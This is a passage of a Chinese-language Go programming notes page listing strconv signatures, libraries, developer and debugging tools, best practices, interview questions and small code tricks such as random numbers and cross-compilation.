class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Itoa</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ParseBool</span><span class="params">(str <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">bool</span>, error)</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ParseFloat</span><span class="params">(s <span class="keyword">string</span>, bitSize <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">float64</span>, error)</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ParseInt</span><span class="params">(s <span class="keyword">string</span>, base <span class="keyword">int</span>, bitSize <span class="keyword">int</span>)</span> <span class="params">(i <span class="keyword">int64</span>, err error)</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ParseUint</span><span class="params">(s <span class="keyword">string</span>, base <span class="keyword">int</span>, bitSize <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">uint64</span>, error)</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Quote</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">QuoteRune</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">QuoteRuneToASCII</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">QuoteRuneToGraphic</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">QuoteToASCII</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">QuoteToGraphic</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Unquote</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">UnquoteChar</span><span class="params">(s <span class="keyword">string</span>, quote <span class="keyword">byte</span>)</span> <span class="params">(value <span class="keyword">rune</span>, multibyte <span class="keyword">bool</span>, tail <span class="keyword">string</span>, err error)</span></span></span><br><span class="line"><span class="function"><span class="title">type</span> <span class="title">NumError</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(e *NumError)</span> <span class="title">Error</span><span class="params">()</span> <span class="title">string</span></span></span><br></pre></td></tr></table></figure><h3 id="casbin"><a href="#casbin" class="headerlink" title="casbin"></a>casbin</h3><h3 id="jwt-go"><a href="#jwt-go" class="headerlink" title="jwt-go"></a>jwt-go</h3><h3 id="cobra"><a href="#cobra" class="headerlink" title="cobra"></a>cobra</h3><h3 id="urfave-cli"><a href="#urfave-cli" class="headerlink" title="urfave/cli"></a>urfave/cli</h3><h3 id="termui"><a href="#termui" class="headerlink" title="termui"></a>termui</h3><h3 id="viper"><a href="#viper" class="headerlink" title="viper"></a>viper</h3><h3 id="redigo"><a href="#redigo" class="headerlink" title="redigo"></a>redigo</h3><h3 id="grpc-go"><a href="#grpc-go" class="headerlink" title="grpc-go"></a>grpc-go</h3><h3 id="pkg-errors"><a href="#pkg-errors" class="headerlink" title="pkg/errors"></a>pkg/errors</h3><h3 id="notify"><a href="#notify" class="headerlink" title="notify"></a>notify</h3><h3 id="gopherjs"><a href="#gopherjs" class="headerlink" title="gopherjs"></a>gopherjs</h3><h3 id="logrus"><a href="#logrus" class="headerlink" title="logrus"></a>logrus</h3><h3 id="zap"><a href="#zap" class="headerlink" title="zap"></a>zap</h3><h3 id="excelize"><a href="#excelize" class="headerlink" title="excelize"></a>excelize</h3><h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><h3 id="fasthttp"><a href="#fasthttp" class="headerlink" title="fasthttp"></a>fasthttp</h3><h3 id="gopsutil"><a href="#gopsutil" class="headerlink" title="gopsutil"></a>gopsutil</h3><h3 id="resty"><a href="#resty" class="headerlink" title="resty"></a>resty</h3><h3 id="GORM"><a href="#GORM" class="headerlink" title="GORM"></a>GORM</h3><h3 id="gonum"><a href="#gonum" class="headerlink" title="gonum"></a>gonum</h3><h3 id="jsoniter"><a href="#jsoniter" class="headerlink" title="jsoniter"></a>jsoniter</h3><h3 id="gofpdf"><a href="#gofpdf" class="headerlink" title="gofpdf"></a>gofpdf</h3><h3 id="Testify"><a href="#Testify" class="headerlink" title="Testify"></a>Testify</h3><h2 id="写个爬虫"><a href="#写个爬虫" class="headerlink" title="写个爬虫"></a>写个爬虫</h2><blockquote><p>简单分布式爬虫，爬取相亲网站资料</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb7jrimvxij20tw09v3zs.jpg" alt="image.png"></p><h2 id="工具集"><a href="#工具集" class="headerlink" title="工具集"></a>工具集</h2><h3 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h3><p><strong>1)sql2go</strong><br>用于将 sql 语句转换为 golang 的 struct. 使用 ddl 语句即可。<br>例如对于创建表的语句: show create table xxx. 将输出的语句，直接粘贴进去就行。<br><a href="http://stming.cn/tool/sql2go.html" target="_blank" rel="noopener">http://stming.cn/tool/sql2go.html</a></p><p><strong>2)toml2go</strong><br>用于将编码后的 toml 文本转换问 golang 的 struct.<br><a href="https://xuri.me/toml-to-go/" target="_blank" rel="noopener">https://xuri.me/toml-to-go/</a></p><p><strong>3)curl2go</strong><br>用来将 curl 命令转化为具体的 golang 代码.<br><a href="https://mholt.github.io/curl-to-go/" target="_blank" rel="noopener">https://mholt.github.io/curl-to-go/</a></p><p><strong>4)json2go</strong><br>用于将 json 文本转换为 struct.<br><a href="https://mholt.github.io/json-to-go/" target="_blank" rel="noopener">https://mholt.github.io/json-to-go/</a></p><p><strong>5) mysql 转 ES 工具</strong><br><a href="http://www.ischoolbar.com/EsParser/" target="_blank" rel="noopener">http://www.ischoolbar.com/EsParser/</a></p><p><strong>6)golang</strong><br>模拟模板的工具，在支持泛型之前，可以考虑使用。<br><a href="https://github.com/cheekybits/genny" target="_blank" rel="noopener">https://github.com/cheekybits/genny</a></p><p><strong>7) 查看某一个库的依赖情况，类似于 go list 功能</strong><br><a href="https://github.com/KyleBanks/depth" target="_blank" rel="noopener">https://github.com/KyleBanks/depth</a></p><p>8) 一个好用的文件压缩和解压工具，集成了 zip，tar 等多种功能，主要还有跨平台。<br><a href="https://github.com/mholt/archiver" target="_blank" rel="noopener">https://github.com/mholt/archiver</a></p><p><strong>9) go 内置命令</strong><br>go list 可以查看某一个包的依赖关系.<br>go vet 可以检查代码不符合 golang 规范的地方。</p><p><strong>10) 热编译工具</strong><br><a href="https://github.com/silenceper/gowatch" target="_blank" rel="noopener">https://github.com/silenceper/gowatch</a></p><p><strong>11)revive</strong><br>golang 代码质量检测工具<br><a href="https://github.com/mgechev/revive" target="_blank" rel="noopener">https://github.com/mgechev/revive</a></p><p><strong>12)Go Callvis</strong><br>golang 的代码调用链图工具<br><a href="https://github.com/TrueFurby/go-callvis" target="_blank" rel="noopener">https://github.com/TrueFurby/go-callvis</a></p><p><strong>13)Realize</strong><br>开发流程改进工具<br><a href="https://github.com/oxequa/realize" target="_blank" rel="noopener">https://github.com/oxequa/realize</a></p><p><strong>14)Gotests</strong><br>自动生成测试用例工具<br><a href="https://github.com/cweill/gotests" target="_blank" rel="noopener">https://github.com/cweill/gotests</a></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p><strong>1)perf</strong><br>代理工具，支持内存，cpu，堆栈查看，并支持火焰图.<br>perf 工具和 go-torch 工具，快捷定位程序问题.<br><a href="https://github.com/uber-archive/go-torch" target="_blank" rel="noopener">https://github.com/uber-archive/go-torch</a><br><a href="https://github.com/google/gops" target="_blank" rel="noopener">https://github.com/google/gops</a></p><p><strong>2) dlv 远程调试</strong><br>基于 goland+dlv 可以实现远程调式的能力.<br><a href="https://github.com/go-delve/delve" target="_blank" rel="noopener">https://github.com/go-delve/delve</a><br>提供了对 golang 原生的支持，相比 gdb 调试，简单太多。</p><p><strong>3) 网络代理工具</strong><br>goproxy 代理，支持多种协议，支持 ssh 穿透和 kcp 协议.<br><a href="https://github.com/snail007/goproxy" target="_blank" rel="noopener">https://github.com/snail007/goproxy</a></p><p><strong>4) 抓包工具</strong><br>go-sniffer 工具，可扩展的抓包工具，可以开发自定义协议的工具包。现在只支持了 http，mysql，redis，mongodb.<br>基于这个工具，我们开发了 qapp 协议的抓包。<br><a href="https://github.com/40t/go-sniffer" target="_blank" rel="noopener">https://github.com/40t/go-sniffer</a></p><p><strong>5) 反向代理工具，快捷开放内网端口供外部使用。</strong><br>ngrok 可以让内网服务外部调用<br><a href="https://ngrok.com/" target="_blank" rel="noopener">https://ngrok.com/</a><br><a href="https://github.com/inconshreveable/ngrok" target="_blank" rel="noopener">https://github.com/inconshreveable/ngrok</a></p><p><strong>6) 配置化生成证书</strong><br>从根证书，到业务侧证书一键生成.<br><a href="https://github.com/cloudflare/cfssl" target="_blank" rel="noopener">https://github.com/cloudflare/cfssl</a></p><p><strong>7) 免费的证书获取工具</strong><br>基于 acme 协议，从 letsencrypt 生成免费的证书，有效期 1 年，可自动续期。<br><a href="https://github.com/Neilpang/acme.sh" target="_blank" rel="noopener">https://github.com/Neilpang/acme.sh</a></p><p>8) 开发环境管理工具，单机搭建可移植工具的利器。支持多种虚拟机后端。<br><strong>vagrant</strong> 常被拿来同 docker 相比，值得拥有。<br><a href="https://github.com/hashicorp/vagrant" target="_blank" rel="noopener">https://github.com/hashicorp/vagrant</a></p><p><strong>9) 轻量级容器调度工具</strong><br>nomad 可以非常方便的管理容器和传统应用，相比 k8s 来说，简单不要太多.<br><a href="https://github.com/hashicorp/nomad" target="_blank" rel="noopener">https://github.com/hashicorp/nomad</a></p><p><strong>10) 敏感信息和密钥管理工具</strong><br><a href="https://github.com/hashicorp/vault" target="_blank" rel="noopener">https://github.com/hashicorp/vault</a></p><p><strong>11) 高度可配置化的 http 转发工具，基于 etcd 配置。</strong><br><a href="https://github.com/gojek/weaver" target="_blank" rel="noopener">https://github.com/gojek/weaver</a></p><p><strong>12) 进程监控工具 supervisor</strong><br><a href="https://www.jianshu.com/p/39b476e808d8" target="_blank" rel="noopener">https://www.jianshu.com/p/39b476e808d8</a></p><p>13) 基于 <strong>procFile</strong> 进程管理工具。相比 supervisor 更加简单。<br><a href="https://github.com/ddollar/foreman" target="_blank" rel="noopener">https://github.com/ddollar/foreman</a></p><p>14) 基于 http，https，websocket 的<strong>调试代理工具</strong>，配置功能丰富。在线教育的 nohost web 调试工具，基于此开发.<br><a href="https://github.com/avwo/whistle" target="_blank" rel="noopener">https://github.com/avwo/whistle</a></p><p><strong>15) 分布式调度工具</strong><br><a href="https://github.com/shunfei/cronsun/blob/master/README_ZH.md" target="_blank" rel="noopener">https://github.com/shunfei/cronsun/blob/master/README_ZH.md</a><br><a href="https://github.com/ouqiang/gocron" target="_blank" rel="noopener">https://github.com/ouqiang/gocron</a></p><p><strong>16) 自动化运维平台 Gaia</strong><br><a href="https://github.com/gaia-pipeline/gaia" target="_blank" rel="noopener">https://github.com/gaia-pipeline/gaia</a></p><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/j3gficicyOvatzJibnFP6EXDYRTOzL8ZgT4oXh17qR8vTl5uHKrXtFcp45GS6VyRXMJw4vnSQ3mDibKxL7ficGrPshw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><h3 id="常用网站"><a href="#常用网站" class="headerlink" title="常用网站"></a>常用网站</h3><p>go 百科全书: <a href="https://awesome-go.com/" target="_blank" rel="noopener">https://awesome-go.com/</a></p><p>json 解析: <a href="https://www.json.cn/" target="_blank" rel="noopener">https://www.json.cn/</a></p><p>出口 IP: <a href="https://ipinfo.io/" target="_blank" rel="noopener">https://ipinfo.io/</a></p><p>redis 命令: <a href="http://doc.redisfans.com/" target="_blank" rel="noopener">http://doc.redisfans.com/</a></p><p>ES 命令首页: <a href="https://www.elastic.co/guide/cn/elasticsearch/guide/current/index.html" target="_blank" rel="noopener">https://www.elastic.co/guide/cn/elasticsearch/guide/current/index.html</a></p><p>UrlEncode: <a href="http://tool.chinaz.com/Tools/urlencode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/Tools/urlencode.aspx</a></p><p>Base64: <a href="https://tool.oschina.net/encrypt?type=3" target="_blank" rel="noopener">https://tool.oschina.net/encrypt?type=3</a></p><p>Guid: <a href="https://www.guidgen.com/" target="_blank" rel="noopener">https://www.guidgen.com/</a></p><p>常用工具: <a href="http://www.ofmonkey.com/" target="_blank" rel="noopener">http://www.ofmonkey.com/</a></p><h3 id="常用库-1"><a href="#常用库-1" class="headerlink" title="常用库"></a>常用库</h3><p><strong>日志</strong><br><a href="https://github.com/Sirupsen/logrus" target="_blank" rel="noopener">https://github.com/Sirupsen/logrus</a><br><a href="https://github.com/uber-go/zap" target="_blank" rel="noopener">https://github.com/uber-go/zap</a></p><p><strong>配置</strong><br>兼容 json，toml，yaml，hcl 等格式的日志库.<br><a href="https://github.com/spf13/viper" target="_blank" rel="noopener">https://github.com/spf13/viper</a></p><p><strong>存储</strong><br>mysql: <a href="https://github.com/go-xorm/xorm" target="_blank" rel="noopener">https://github.com/go-xorm/xorm</a><br>es: <a href="https://github.com/elastic/elasticsearch" target="_blank" rel="noopener">https://github.com/elastic/elasticsearch</a><br>redis: <a href="https://github.com/gomodule/redigo" target="_blank" rel="noopener">https://github.com/gomodule/redigo</a><br>mongo: <a href="https://github.com/mongodb/mongo-go-driver" target="_blank" rel="noopener">https://github.com/mongodb/mongo-go-driver</a><br>kafka: <a href="https://github.com/Shopify/sarama" target="_blank" rel="noopener">https://github.com/Shopify/sarama</a></p><p><strong>数据结构</strong><br><a href="https://github.com/emirpasic/gods" target="_blank" rel="noopener">https://github.com/emirpasic/gods</a></p><p><strong>命令行</strong><br><a href="https://github.com/spf13/cobra" target="_blank" rel="noopener">https://github.com/spf13/cobra</a></p><p><strong>框架</strong><br><a href="https://github.com/grpc/grpc-go" target="_blank" rel="noopener">https://github.com/grpc/grpc-go</a><br><a href="https://github.com/gin-gonic/gin" target="_blank" rel="noopener">https://github.com/gin-gonic/gin</a></p><p><strong>并发</strong><br><a href="https://github.com/Jeffail/tunny" target="_blank" rel="noopener">https://github.com/Jeffail/tunny</a><br><a href="https://github.com/benmanns/goworker" target="_blank" rel="noopener">https://github.com/benmanns/goworker</a><br>现在我们框架在用的，虽然 star 不多，但是确实好用，当然还可以更好用.<br><a href="https://github.com/rafaeldias/async" target="_blank" rel="noopener">https://github.com/rafaeldias/async</a></p><p><strong>工具</strong><br>定义了实用的判定类，以及针对结构体的校验逻辑，避免业务侧写复杂的代码.<br><a href="https://github.com/asaskevich/govalidator" target="_blank" rel="noopener">https://github.com/asaskevich/govalidator</a><br><a href="https://github.com/bytedance/go-tagexpr" target="_blank" rel="noopener">https://github.com/bytedance/go-tagexpr</a></p><p>protobuf 文件动态解析的接口，可以实现反射相关的能力。<br><a href="https://github.com/jhump/protoreflect" target="_blank" rel="noopener">https://github.com/jhump/protoreflect</a></p><p><strong>表达式引擎工具</strong><br><a href="https://github.com/Knetic/govaluate" target="_blank" rel="noopener">https://github.com/Knetic/govaluate</a><br><a href="https://github.com/google/cel-go" target="_blank" rel="noopener">https://github.com/google/cel-go</a></p><p><strong>字符串处理</strong><br><a href="https://github.com/huandu/xstrings" target="_blank" rel="noopener">https://github.com/huandu/xstrings</a></p><p><strong>ratelimit 工具</strong><br><a href="https://github.com/uber-go/ratelimit" target="_blank" rel="noopener">https://github.com/uber-go/ratelimit</a><br><a href="https://blog.csdn.net/chenchongg/article/details/85342086" target="_blank" rel="noopener">https://blog.csdn.net/chenchongg/article/details/85342086</a><br><a href="https://github.com/juju/ratelimit" target="_blank" rel="noopener">https://github.com/juju/ratelimit</a></p><p><strong>golang 熔断的库</strong><br>熔断除了考虑频率限制，还要考虑 qps，出错率等其他东西.<br><a href="https://github.com/afex/hystrix-go" target="_blank" rel="noopener">https://github.com/afex/hystrix-go</a><br><a href="https://github.com/sony/gobreaker" target="_blank" rel="noopener">https://github.com/sony/gobreaker</a></p><p><strong>表格</strong><br><a href="https://github.com/chenjiandongx/go-echarts" target="_blank" rel="noopener">https://github.com/chenjiandongx/go-echarts</a></p><p><strong>tail 工具库</strong><br><a href="https://github.com/hpcloud/taglshi" target="_blank" rel="noopener">https://github.com/hpcloud/taglshi</a></p><h2 id="最佳实践-1"><a href="#最佳实践-1" class="headerlink" title="最佳实践"></a>最佳实践</h2><p><a href="https://golang.org/doc/effective_go.html" target="_blank" rel="noopener">Effective Go</a> ，Go 的语法不复杂，所以，Go 语言的最佳实践只需要看这篇官方文档就够了。</p><h3 id="以下是在实际开发过程中遇到的一些问题，仅供参考："><a href="#以下是在实际开发过程中遇到的一些问题，仅供参考：" class="headerlink" title="以下是在实际开发过程中遇到的一些问题，仅供参考："></a>以下是在实际开发过程中遇到的一些问题，仅供参考：</h3><ol><li>异常处理统一使用 error，不要使用 panic/recover 来模拟 throw…catch，最初我是这么做的，后来发现这完全是自以为是的做法。</li><li>原生的 error 过于简单，而在实际的 API 开发过程中，不同的异常情况需要附带不同的返回码，基于此，有必要对 error 再进行一层封装。</li><li>任何协程逻辑执行体，逻辑最开始处必须要有 defer recover () 异常恢复处理，否则 goroutine 内出现的 panic，将导致整个进程宕掉，需要避免部分逻辑 BUG 造成全局影响。</li><li>在 Golang 中，变量 (chan 类型除外) 的操作是非线程安全的，也包括像 int 这样的基本类型，因此并发操作全局变量时一定要考虑加锁，特别是对 map 的并发操作。</li><li>所有对 map 键值的获取，都应该判断存在性，最好是对同类操作进行统一封装，避免出现不必要的运行时异常。</li><li>定义 slice 数据类型时，尽量预设长度，避免内部出现不必要的数据重组。</li></ol><h3 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h3><p>Go 语言比较常见并且使用广泛的代码规范就是官方提供的 <a href="https://github.com/golang/go/wiki/CodeReviewComments" target="_blank" rel="noopener">Go Code Review Comments</a>，无论你是短期还是长期使用 Go 语言编程，都应该<strong>至少完整地阅读一遍这个官方的代码规范指南</strong>，它既是我们在写代码时应该遵守的规则，也是在代码审查时需要注意的规范。</p><h4 id="goimports"><a href="#goimports" class="headerlink" title="goimports"></a>goimports</h4><p><a href="https://godoc.org/golang.org/x/tools/cmd/goimports" target="_blank" rel="noopener">goimports</a> 是 Go 语言官方提供的工具，它能够为我们自动格式化 Go 语言代码并对所有引入的包进行管理，包括自动增删依赖的包引用、将依赖包按字母序排序并分类。相信很多人使用的 IDE 都会将另一个官方提供的工具 <a href="https://golang.org/cmd/gofmt/" target="_blank" rel="noopener">gofmt</a> 对代码进行格式化，而 <code>goimports</code> 就是等于 <code>gofmt</code> 加上依赖包管理。</p><h4 id="golint"><a href="#golint" class="headerlink" title="golint"></a>golint</h4><p>在基础库或者框架中使用 <code>golint</code> 进行静态检查（或者同时使用 <code>golint</code> 和 <a href="https://github.com/golangci/golangci-lint" target="_blank" rel="noopener">golangci-lint</a>），在其他的项目中使用可定制化的 <code>golangci-lint</code> 来进行静态检查，因为在基础库和框架中施加强限制对于整体的代码质量有着更大的收益。</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p><a href="https://github.com/golang-standards/project-layout" target="_blank" rel="noopener">https://github.com/golang-standards/project-layout</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── LICENSE.md</span><br><span class="line">├── Makefile</span><br><span class="line">├── README.md</span><br><span class="line">├── api</span><br><span class="line">├── assets</span><br><span class="line">├── build</span><br><span class="line">├── cmd</span><br><span class="line">├── configs</span><br><span class="line">├── deployments</span><br><span class="line">├── docs</span><br><span class="line">├── examples</span><br><span class="line">├── githooks</span><br><span class="line">├── init</span><br><span class="line">├── internal</span><br><span class="line">├── pkg</span><br><span class="line">├── scripts</span><br><span class="line">├── test</span><br><span class="line">├── third_party</span><br><span class="line">├── tools</span><br><span class="line">├── vendor</span><br><span class="line">├── web</span><br><span class="line">└── website</span><br></pre></td></tr></table></figure><h3 id="模块拆分"><a href="#模块拆分" class="headerlink" title="模块拆分"></a>模块拆分</h3><h3 id="显式与隐式"><a href="#显式与隐式" class="headerlink" title="显式与隐式"></a>显式与隐式</h3><h3 id="面向接口-1"><a href="#面向接口-1" class="headerlink" title="面向接口"></a>面向接口</h3><h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><ul><li>聊聊 GPM？</li><li>go 的 new 和 make 区别</li><li>go 怎么从源码编译到二进制文件</li><li>go 的调度模型</li><li>go 的锁如何实现，用了什么 cpu 指令</li><li>go 的 runtime 如何实现</li><li>看过 sql 的连接池实现吗</li><li>c++ 的 map 和 go 的 map 的区别（红黑树和 hashtable）</li><li>ctx 包了解吗？有什么用？</li><li>go 什么情况下会发生内存泄漏？（他说 ctx 没有 cancel 的时候，这个真不知道）</li><li>怎么实现协程完美退出？</li><li>智力题：1000 瓶酒中有 1 瓶毒酒，10 只老鼠，7 天后毒性才发作，第 8 天要卖了，怎么求那瓶毒酒？</li><li>简单 dp 题，n*n 矩阵从左上角到右下角有多少种走法（只限往下和往右走）</li><li>用 channel 实现定时器？（实际上是两个协程同步）</li><li>channel 的实现？</li><li>go 为什么高并发好？讲了 go 的调度模型</li><li>操作系统内存管理？进程通讯，为什么共享存储区效率最高</li><li>实现一个 hashmap，解决 hash 冲突的方法，解决 hash 倾斜的方法</li><li>c++ 的模板跟 go 的 interface 的区别</li><li>怎么理解 go 的 interface</li><li>go 代码运行结果（闭包函数）</li><li>git 和 svn 区别，模型</li><li>唯一订单号问题，并发量高的话怎么解决</li><li>hash 表设计要注意什么问题</li><li>数组和为 n 的数组对</li><li>lru 实现</li><li>多个线程读，一个线程写一个 int32 会不会有问题，int64 呢（这里面试官后来说了要看数据总线的位数，32 位的话写 int32 没问题，int64 就有问题）</li><li>GO 语言中的协程与 Python 中的协程的区别？ 主要讲解 Go 中 GMP 机制</li></ul><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go doc json  // 输出 json 包对应的文档</span><br></pre></td></tr></table></figure><h3 id="跨平台编译"><a href="#跨平台编译" class="headerlink" title="跨平台编译"></a>跨平台编译</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GOOS=darwin GOARCH=amd64 go build</span><br><span class="line"></span><br><span class="line">GOOS=windows GOARCH=amd64 go build</span><br></pre></td></tr></table></figure><h3 id="go-get-被墙"><a href="#go-get-被墙" class="headerlink" title="go get 被墙"></a>go get 被墙</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=socks5://127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">GitHub 上有官方镜像库，如 https://github.com/golang/net 即 https://golang.org/x/net</span><br><span class="line">git clone https://github.com/golang/tools.git</span><br><span class="line"><span class="meta">#</span> 然后进对应目录 go install，bin 目录就有了。</span><br><span class="line">go install github/xxx/xxx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> go mod 优先使用镜像</span><br><span class="line">go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/</span><br></pre></td></tr></table></figure><h3 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"time"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"math/rand"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 例如，`rand.Intn` 返回一个随机的整数 n，`0 &lt;= n &lt;= 100`。</span></span><br><span class="line">    fmt.Print(rand.Intn(<span class="number">100</span>), <span class="string">","</span>)</span><br><span class="line">    fmt.Print(rand.Intn(<span class="number">100</span>))</span><br><span class="line">    fmt.Println()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// `rand.Float64` 返回一个64位浮点数 `f`，`0.0 &lt;= f &lt;= 1.0`。</span></span><br><span class="line">    fmt.Println(rand.Float64())</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个技巧可以用来生成其他范围的随机浮点数，例如 `5.0 &lt;= f &lt;= 10.0`</span></span><br><span class="line">    fmt.Print((rand.Float64()*<span class="number">5</span>)+<span class="number">5</span>, <span class="string">","</span>)</span><br><span class="line">    fmt.Print((rand.Float64() * <span class="number">5</span>) + <span class="number">5</span>)</span><br><span class="line">    fmt.Println()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 默认情况下，给定的种子是确定的，每次都会产生相同的随机数数字序列。要产生变化的序列，需要给定一个变化的种子。</span></span><br><span class="line">    <span class="comment">// 需要注意的是，如果你出于加密目的，需要使用随机数的话，请使用 `crypto/rand` 包，此方法不够安全。</span></span><br><span class="line">    s1 := rand.NewSource(time.Now().UnixNano())</span><br><span class="line">    r1 := rand.New(s1)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用上面返回的 `rand.Source` 的函数和调用 `rand` 包中函数是相同的。</span></span><br><span class="line">    fmt.Print(r1.Intn(<span class="number">100</span>), <span class="string">","</span>)</span><br><span class="line">    fmt.Print(r1.Intn(<span class="number">100</span>))</span><br><span class="line">    fmt.Println()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果使用相同的种子生成的随机数生成器，将会产生相同的随机数序列。</span></span><br><span class="line">    s2 := rand.NewSource(<span class="number">42</span>)</span><br><span class="line">    r2 := rand.New(s2)</span><br><span class="line">    fmt.Print(r2.Intn(<span class="number">100</span>), <span class="string">","</span>)</span><br><span class="line">    fmt.Print(r2.Intn(<span class="number">100</span>))</span><br><span class="line">    fmt.Println()</span><br><span class="line">    s3 := rand.NewSource(<span class="number">42</span>)</span><br><span class="line">    r3 := rand.New(s3)</span><br><span class="line">    fmt.Print(r3.Intn(<span class="number">100</span>), <span class="string">","</span>)</span><br><span class="line">    fmt.Print(r3.Intn(<span class="number">100</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h3><h4 id="如何声明一个最大的int和uint常量？"><a href="#如何声明一个最大的int和uint常量？" class="headerlink" title="如何声明一个最大的int和uint常量？"></a>如何声明一个最大的int和uint常量？</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MaxUint = ^<span class="keyword">uint</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">const</span> MaxInt = <span class="keyword">int</span>(^<span class="keyword">uint</span>(<span class="number">0</span>) &gt;&gt; <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="如何在编译时刻决定系统原生字的尺寸？"><a href="#如何在编译时刻决定系统原生字的尺寸？" class="headerlink" title="如何在编译时刻决定系统原生字的尺寸？"></a>如何在编译时刻决定系统原生字的尺寸？</h4><p>这个技巧和Go无关。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Is64bitArch = ^<span class="keyword">uint</span>(<span class="number">0</span>) &gt;&gt; <span class="number">63</span> == <span class="number">1</span></span><br><span class="line"><span class="keyword">const</span> Is32bitArch = ^<span class="keyword">uint</span>(<span class="number">0</span>) &gt;&gt; <span class="number">63</span> == <span class="number">0</span></span><br><span class="line"><span class="keyword">const</span> WordBits = <span class="number">32</span> &lt;&lt; (^<span class="keyword">uint</span>(<span class="number">0</span>) &gt;&gt; <span class="number">63</span>) <span class="comment">// 64或32</span></span><br></pre></td></tr></table></figure><h4 id="使用闭包进行调试"><a href="#使用闭包进行调试" class="headerlink" title="使用闭包进行调试"></a>使用闭包进行调试</h4><p>当您在分析和调试复杂的程序时，无数个函数在不同的代码文件中相互调用，如果这时候能够准确地知道哪个文件中的具体哪个函数正在执行，对于调试是十分有帮助的。您可以使用 <code>runtime</code> 或 <code>log</code> 包中的特殊函数来实现这样的功能。包 <code>runtime</code> 中的函数 <code>Caller()</code> 提供了相应的信息，因此可以在需要的时候实现一个 <code>where()</code> 闭包函数来打印函数执行的位置：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">where := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    _, file, line, _ := runtime.Caller(<span class="number">1</span>)</span><br><span class="line">    log.Printf(<span class="string">"%s:%d"</span>, file, line)</span><br><span class="line">&#125;</span><br><span class="line">where()</span><br><span class="line"><span class="comment">// some code</span></span><br><span class="line">where()</span><br><span class="line"><span class="comment">// some more code</span></span><br><span class="line">where()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log.SetFlags(log.Llongfile)</span><br><span class="line">log.Print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">var where = log.Print</span><br><span class="line">func func1() &#123;</span><br><span class="line">where()</span><br><span class="line">... some code</span><br><span class="line">where()</span><br><span class="line">... some code</span><br><span class="line">where()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
